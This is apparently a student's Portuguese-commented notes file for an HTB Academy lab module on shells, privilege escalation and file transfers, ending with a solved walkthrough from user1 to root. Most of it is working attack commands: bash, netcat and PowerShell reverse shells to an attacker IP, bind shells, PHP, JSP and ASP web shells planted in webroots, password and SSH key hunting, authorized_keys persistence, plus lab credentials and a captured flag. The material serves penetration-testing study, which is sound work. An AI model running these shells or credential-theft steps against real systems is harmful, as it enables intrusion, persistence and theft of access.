#######################################################################
# HTB ACADEMY - GETTING STARTED
# AULAS:
# - Types of Shells
# - Privilege Escalation
# - Transferring Files
#
# OBJETIVO:
# Documentar TODOS os comandos apresentados nas aulas
# + TODOS os comandos utilizados durante os exercícios
# + Fluxo completo utilizado para atingir os objetivos
#
# LAB RESOLVIDO:
# user1 -> user2 -> root
#######################################################################


#######################################################################
# PARTE 1 - TYPES OF SHELLS
#######################################################################

#######################################################################
# REVERSE SHELL
#
# Conceito:
# A vítima conecta de volta para o atacante.
#
# Fluxo:
#
# Atacante
#    │
#    ├── nc -lvnp 1234
#    │
#    ▼
# Vítima executa payload
#    │
#    ▼
# Shell retorna ao atacante
#######################################################################

# Listener Netcat
nc -lvnp 1234

# Descobrir IP VPN HTB
ip a

# Reverse Shell Bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

# Reverse Shell Netcat FIFO
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 1234 >/tmp/f

# Reverse Shell PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234); ..."

# Verificar usuário obtido
id


#######################################################################
# BIND SHELL
#
# Conceito:
# A vítima abre uma porta.
# O atacante conecta nela.
#######################################################################

# Bind Shell Bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 1234 >/tmp/f

# Bind Shell Python
python -c 'exec("""import socket as s,subprocess as sp; ... """)'

# Bind Shell PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...

# Conectar
nc 10.10.10.1 1234

# Verificar usuário
id


#######################################################################
# UPGRADE TTY
#
# Transformar shell ruim em shell interativa
#######################################################################

# Spawn Bash PTY
python -c 'import pty; pty.spawn("/bin/bash")'

# Background
CTRL+Z

# Ajustar terminal local
stty raw -echo

# Voltar shell
fg

# Recuperar terminal
reset

# Verificar TERM
echo $TERM

# Verificar tamanho terminal
stty size

# Ajustar terminal remoto
export TERM=xterm-256color

# Exemplo
stty rows 67 columns 318


#######################################################################
# WEB SHELLS
#######################################################################

# PHP
<?php system($_REQUEST["cmd"]); ?>

# JSP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# ASP
<% eval request("cmd") %>

# Apache Webroot
/var/www/html/

# Nginx Webroot
/usr/local/nginx/html/

# IIS Webroot
c:\inetpub\wwwroot\

# XAMPP Webroot
C:\xampp\htdocs\

# Criar PHP WebShell
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

# Executar via navegador
http://IP/shell.php?cmd=id

# Executar via curl
curl http://IP/shell.php?cmd=id


#######################################################################
# PARTE 2 - PRIVILEGE ESCALATION
#######################################################################

#######################################################################
# ENUMERAÇÃO INICIAL
#######################################################################

whoami

id

hostname

uname -a

cat /etc/os-release

sudo -l

history

ps aux

netstat -tulpn

ls -la /home

cat /etc/passwd | grep sh$

find / -perm -4000 -type f 2>/dev/null

crontab -l

cat /etc/crontab

ls ~/.ssh

dpkg -l


#######################################################################
# LINPEAS
#######################################################################

./linpeas.sh


#######################################################################
# KERNEL ENUMERATION
#######################################################################

uname -a

searchsploit 3.9.0

searchsploit dirtycow


#######################################################################
# SOFTWARE ENUMERATION
#######################################################################

dpkg -l

rpm -qa


#######################################################################
# SUDO ENUMERATION
#######################################################################

sudo -l

sudo su -

whoami


#######################################################################
# NOPASSWD EXEMPLO
#######################################################################

sudo -u user /bin/echo Hello World


#######################################################################
# GTFOBINS
#######################################################################

sudo vim

sudo less

sudo find

sudo tar

sudo awk


#######################################################################
# CRON JOBS
#######################################################################

crontab -l

cat /etc/crontab

ls -la /etc/cron*

# Diretórios importantes
/etc/crontab
/etc/cron.d/
/var/spool/cron/crontabs/root


#######################################################################
# CREDENCIAIS EXPOSTAS
#######################################################################

grep -Ri password /

cat config.php

cat .env

cat web.config

cat settings.py

cat ~/.bash_history

cat ~/.mysql_history

cat PSReadLine


#######################################################################
# PASSWORD REUSE
#######################################################################

su -

# Inserir senha encontrada


#######################################################################
# SSH KEYS
#######################################################################

ls -la ~/.ssh

cat ~/.ssh/id_rsa

chmod 600 id_rsa

ssh root@IP -i id_rsa

ssh-keygen -f key

echo "PUBLIC_KEY" >> ~/.ssh/authorized_keys

ssh root@IP -i key


#######################################################################
# PARTE 3 - FILE TRANSFERS
#######################################################################

#######################################################################
# PYTHON HTTP SERVER
#######################################################################

cd /tmp

python3 -m http.server 8000


#######################################################################
# WGET
#######################################################################

wget http://10.10.14.1:8000/linpeas.sh


#######################################################################
# CURL
#######################################################################

curl http://10.10.14.1:8000/linpeas.sh -o linpeas.sh


#######################################################################
# SCP
#######################################################################

scp linenum.sh user@remotehost:/tmp/linenum.sh

scp -P 2222 arquivo.txt user@IP:/tmp/


#######################################################################
# BASE64
#######################################################################

base64 shell -w 0

echo BASE64_AQUI | base64 -d > shell


#######################################################################
# VALIDAR TRANSFERÊNCIA
#######################################################################

file shell

md5sum shell


#######################################################################
# EXERCÍCIO RESOLVIDO
#
# Pergunta 1:
# user1 -> user2
#
# Pergunta 2:
# user2 -> root
#######################################################################


#######################################################################
# PASSO 1 - ACESSO INICIAL
#######################################################################

ssh user1@154.57.164.66 -p 31011

# senha
password1


#######################################################################
# ENUMERAÇÃO COMO USER1
#######################################################################

whoami

sudo -l

ls -la /home

cat /etc/passwd | grep sh$

find / -user user2 2>/dev/null


#######################################################################
# DESCOBERTA
#######################################################################

# Resultado:

(user2 : user2) NOPASSWD: /bin/bash


#######################################################################
# MOVIMENTO LATERAL
#######################################################################

sudo -u user2 /bin/bash

whoami

cat /home/user2/flag.txt

# FLAG 1

HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}


#######################################################################
# ENUMERAÇÃO COMO USER2
#######################################################################

find / -perm -4000 -type f 2>/dev/null

ls -la /home/user2

history

find / -type f 2>/dev/null | grep -E "config|conf|backup|bak|txt|log" | head -100

grep -R "password" /home /etc 2>/dev/null

find / -name "*.conf" 2>/dev/null

find / -name "*.cfg" 2>/dev/null

find / -name "*.php" 2>/dev/null

ls -la /

ls -la /opt

ls -la /root


#######################################################################
# DESCOBERTA CRÍTICA
#######################################################################

ls -la /root

# Resultado:

drwxr-x--- root user2 /root

# user2 pertence ao grupo com acesso ao diretório root


#######################################################################
# ENUMERAR SSH ROOT
#######################################################################

ls -la /root/.ssh

cat /root/.ssh/id_rsa

cat /root/.ssh/authorized_keys

cat /root/.bash_history

cat /root/.viminfo


#######################################################################
# DESCOBERTA FINAL
#######################################################################

# Chave privada do root encontrada:

/root/.ssh/id_rsa


#######################################################################
# ESCALAÇÃO PARA ROOT
#######################################################################

# Na Kali

nano root_id_rsa

# Colar chave privada

chmod 600 root_id_rsa

ssh root@154.57.164.66 -p 31011 -i root_id_rsa


#######################################################################
# OBJETIVO FINAL
#######################################################################

whoami

cat /root/flag.txt


#######################################################################
# FLUXO COMPLETO DA MÁQUINA
#######################################################################

# Acesso Inicial
ssh user1@154.57.164.66 -p 31011

# Enumeração
sudo -l

# Descoberta
(user2:user2) NOPASSWD /bin/bash

# Movimento lateral
sudo -u user2 /bin/bash

# Captura Flag 1
cat /home/user2/flag.txt

# Enumeração user2
ls -la /root

# Descoberta
grupo user2 possui acesso ao diretório root

# Enumeração SSH
ls -la /root/.ssh

# Descoberta
id_rsa do root legível

# Copiar chave

# Ajustar permissões
chmod 600 root_id_rsa

# Login root
ssh root@IP -p PORTA -i root_id_rsa

# Captura Flag 2
cat /root/flag.txt

#######################################################################
# RESUMO DO RACIOCÍNIO
#######################################################################

# user1
#   ↓
# sudo -l
#   ↓
# NOPASSWD /bin/bash
#   ↓
# user2
#   ↓
# acesso ao diretório /root
#   ↓
# leitura de /root/.ssh/id_rsa
#   ↓
# SSH como root
#   ↓
# root
#   ↓
# /root/flag.txt
#######################################################################